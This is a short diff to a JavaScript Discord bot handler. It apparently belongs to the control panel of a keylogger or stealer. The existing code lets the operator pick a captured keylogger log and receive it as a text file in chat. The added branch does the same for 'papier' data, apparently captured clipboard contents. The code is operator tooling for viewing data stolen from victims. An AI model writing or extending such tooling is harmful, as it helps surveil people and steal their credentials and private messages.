@@ -66,6 +66,11 @@ client.on('interactionCreate', async interaction => {
         const endpoint = `${API_BASE_URL}/keylogger/log/${keyloggerDataId}`;
         const filename = `keylogger_${keyloggerDataId}.txt`;
         await handleFileResponse(interaction, endpoint, filename, "Voici le contenu du fichier :", 'text');
+    } else if (interaction.customId === "select_papier") {
+        const papierDataId = interaction.values[0];
+        const endpoint = `${API_BASE_URL}/papier/papier/${papierDataId}`;
+        const filename = `papier_${papierDataId}.txt`;
+        await handleFileResponse(interaction, endpoint, filename, "Voici le contenu du fichier :", 'text');
     }
 
 });
